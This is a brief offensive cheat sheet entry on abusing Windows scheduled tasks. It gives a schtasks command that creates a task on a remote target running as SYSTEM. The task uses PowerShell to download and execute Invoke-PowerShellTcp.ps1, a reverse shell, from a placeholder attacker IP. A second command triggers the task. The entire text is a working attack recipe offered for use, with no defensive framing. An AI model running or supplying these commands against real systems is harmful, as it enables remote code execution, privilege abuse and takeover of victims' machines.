 # Abusing Scheduled Tasks
 - Create a Scheduled Task from the CLI to run as System
`schtasks /create /S <targetsystem> /SC Weekly /RU "NT Authority\SYSTEM" /TN "<taskname>" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1''')'"`
 - Run a scheduled task from CLI
`schtasks /Run /S <targetsystem> /TN "<taskname>"`